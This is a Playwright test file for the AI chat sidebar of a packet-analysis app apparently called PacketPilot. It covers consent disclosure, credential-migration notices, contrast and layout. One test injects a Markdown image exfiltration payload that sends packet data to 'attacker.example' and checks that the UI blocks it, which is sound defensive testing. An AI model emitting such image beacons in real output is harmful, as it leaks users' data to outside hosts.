import { test, expect } from "../helpers/setup";
import { createMockApiScript } from "../fixtures/mock-api";
import { MOCK_RUNTIME_DIAGNOSTICS } from "../fixtures/test-data";

test.describe("Chat Sidebar", () => {
  test("opens with Ctrl+K", async ({ mockPage: page }) => {
    await page.keyboard.press("Control+k");
    await expect(page.locator(".chat-sidebar")).toBeVisible();
  });

  test("mock AI runtime refuses to start without accepted authentication", async ({ mockPage: page }) => {
    const status = (await page.evaluate("window.packetPilot.ai.start()")) as { is_running: boolean };
    expect(status.is_running).toBe(false);
  });

  test("shows provider setup when no API key configured", async ({ mockPage: page }) => {
    await page.keyboard.press("Control+k");
    await expect(page.locator(".chat-sidebar")).toBeVisible();
    // Should show provider setup since no API key
    await expect(page.locator(".provider-setup")).toBeVisible();
  });

  test("requires informed consent before connecting OpenRouter", async ({ mockPage: page }) => {
    await page.keyboard.press("Control+k");
    await page.locator("#openrouter-api-key").fill("«redacted:sk-…»");

    await expect(page.locator(".provider-disclosure")).toContainText("raw packet bytes");
    await expect(page.locator(".provider-disclosure")).toContainText("capture filename");
    await expect(page.locator(".provider-disclosure")).toContainText("OpenRouter");
    await expect(page.locator(".provider-disclosure")).toContainText("beyond your current selection");
    await expect(page.locator(".provider-disclosure")).toContainText("each requested tool result");
    await expect(page.locator(".provider-consent")).toContainText("additional packets or streams");
    await expect(page.locator(".provider-connect-button")).toBeDisabled();

    await page.locator(".provider-consent input").check();
    await expect(page.locator(".provider-connect-button")).toBeEnabled();
  });

  test("primary connect button meets dark-theme text contrast", async ({ mockPage: page }) => {
    await page.keyboard.press("Control+k");
    await page.locator("#openrouter-api-key").fill("test-credential");
    await page.locator('.provider-consent input[type="checkbox"]').check();
    const button = page.locator(".provider-connect-button");
    await expect(button).toBeEnabled();

    const getContrast = () => button.evaluate((element) => {
      const parseRgb = (value: string) => (value.match(/[\d.]+/g) ?? []).slice(0, 3).map(Number);
      const luminance = (rgb: number[]) => {
        const linear = rgb.map((channel) => {
          const value = channel / 255;
          return value <= 0.03928 ? value / 12.92 : ((value + 0.055) / 1.055) ** 2.4;
        });
        return 0.2126 * linear[0] + 0.7152 * linear[1] + 0.0722 * linear[2];
      };
      const style = getComputedStyle(element);
      const foreground = luminance(parseRgb(style.color));
      const background = luminance(parseRgb(style.backgroundColor));
      return (Math.max(foreground, background) + 0.05) / (Math.min(foreground, background) + 0.05);
    });

    expect(await getContrast()).toBeGreaterThanOrEqual(4.5);
    await button.hover();
    expect(await getContrast()).toBeGreaterThanOrEqual(4.5);
  });

  test("requires migrated API-key users to accept the current disclosure", async ({
    unacceptedAuthedPage: page,
  }) => {
    await page.keyboard.press("Control+k");

    await expect
      .poll(async () => {
        const stored = (await page.evaluate("window.packetPilot.settings.get()")) as {
          hasApiKey?: boolean;
        };
        return stored?.hasApiKey;
      })
      .toBe(true);
    await expect(page.locator(".provider-migration-notice")).toContainText("saved API key");
    await expect(page.locator(".provider-disclosure")).toBeVisible();
    await expect(page.locator(".chat-messages")).not.toBeVisible();
    await expect(page.locator(".provider-connect-button")).toBeDisabled();

    await page.locator(".provider-consent input").check();
    await page.locator(".provider-connect-button").click();
    await expect(page.locator(".provider-setup")).not.toBeVisible();
  });

  test("locked credentials distinguish legacy plaintext from encrypted storage", async ({ page }) => {
    await page.addInitScript(createMockApiScript({
      runtimeDiagnostics: MOCK_RUNTIME_DIAGNOSTICS,
      settings: {
        hasApiKey: true,
        apiKeyUnavailable: true,
        aiDisclosureAccepted: false,
        model: "anthropic/claude-sonnet-4.6",
      },
    }));
    await page.goto("/");
    await expect(page.locator(".open-button")).toBeEnabled();

    await page.getByRole("button", { name: "AI Chat" }).click();
    await expect(page.locator(".chat-sidebar")).toBeVisible();

    const notice = page.locator(".provider-migration-notice");
    await expect(notice).toContainText("legacy plaintext key");
    await expect(notice).toContainText("settings file to your user account");
    await expect(notice).not.toContainText("preserved the encrypted key");
  });

  test("closes with Escape", async ({ mockPage: page }) => {
    await page.keyboard.press("Control+k");
    await expect(page.locator(".chat-sidebar")).toBeVisible();

    await page.keyboard.press("Escape");
    await expect(page.locator(".chat-sidebar")).not.toBeVisible();
  });

  test("closes with close button", async ({ mockPage: page }) => {
    await page.keyboard.press("Control+k");
    await expect(page.locator(".chat-sidebar")).toBeVisible();

    await page.click('[title="Close (Esc)"]');
    await expect(page.locator(".chat-sidebar")).not.toBeVisible();
  });

  test("shows chat interface when API key is configured", async ({ authedPage: page }) => {
    await page.keyboard.press("Control+k");
    await expect(page.locator(".chat-sidebar")).toBeVisible();
    await expect(page.locator(".chat-messages")).toBeVisible();
    await expect(page.locator(".provider-setup")).toHaveCount(0);
  });

  test("assistant Markdown images remain inert", async ({ authedPage: page }) => {
    await page.keyboard.press("Control+k");
    await expect(page.locator(".chat-sidebar")).toBeVisible();
    await expect(page.locator(".chat-messages")).toBeVisible({ timeout: 15_000 });
    await page.locator(".chat-input").fill("Show the result");
    await page.locator(".chat-input").press("Enter");
    await page.evaluate(`window.__mockEmitStreamEvent({
      streamId: "mock-stream-1",
      type: "done",
      result: {
        message: "![tracker](https://attacker.example/leak?packet=secret)",
        suggested_filter: null,
        tool_calls: [],
        model: "anthropic/claude-sonnet-4.6",
        latency_ms: 1
      }
    })`);

    const assistant = page.locator(".chat-message.assistant").last();
    await expect(assistant).toContainText("External image omitted");
    await expect(assistant.locator("img")).toHaveCount(0);
  });

  test("has header with title", async ({ mockPage: page }) => {
    await page.keyboard.press("Control+k");
    await expect(page.locator(".chat-header h3")).toHaveText("PacketPilot AI");
  });

  test("has status indicator dot", async ({ mockPage: page }) => {
    await page.keyboard.press("Control+k");
    await expect(page.locator(".chat-header .status-dot")).toBeVisible();
  });

  test("has Clear button", async ({ mockPage: page }) => {
    await page.keyboard.press("Control+k");
    await expect(page.locator('[title="Clear chat"]')).toBeVisible();
  });

  test("resize handle exists", async ({ mockPage: page }) => {
    await page.keyboard.press("Control+k");
    await expect(page.locator(".chat-resize-handle")).toBeVisible();
  });

  test("sidebar has default width", async ({ mockPage: page }) => {
    await page.keyboard.press("Control+k");
    const sidebar = page.locator(".chat-sidebar");
    const box = await sidebar.boundingBox();
    // Default width is 380px
    expect(box!.width).toBeCloseTo(380, -1);
  });
});
